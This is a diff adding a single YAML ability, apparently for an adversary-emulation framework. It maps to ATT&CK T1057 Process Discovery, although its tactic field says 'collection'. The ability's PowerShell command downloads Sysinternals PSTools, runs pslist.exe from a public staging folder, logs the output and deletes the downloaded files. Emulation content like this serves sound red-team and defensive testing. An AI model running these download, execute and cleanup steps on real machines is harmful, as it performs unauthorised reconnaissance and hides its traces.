@@ -1,0 +1,21 @@
+---
+
+- id: cc191baa-7472-4386-a2f4-42f203f1acfd
+  name: SysInternals PSTool Process Discovery
+  description: Process discovery via SysInternals pstool
+  tactic: collection
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+            $ps_url = "https://download.sysinternals.com/files/PSTools.zip";
+            $download_folder = "C:\Users\Public\";
+            $staging_folder = "C:\Users\Public\temp";
+            Start-BitsTransfer -Source $ps_url -Destination $download_folder;
+            Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;
+            iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;
+            Remove-Item $download_folder"PSTools.zip";
+            Remove-Item $staging_folder -Recurse
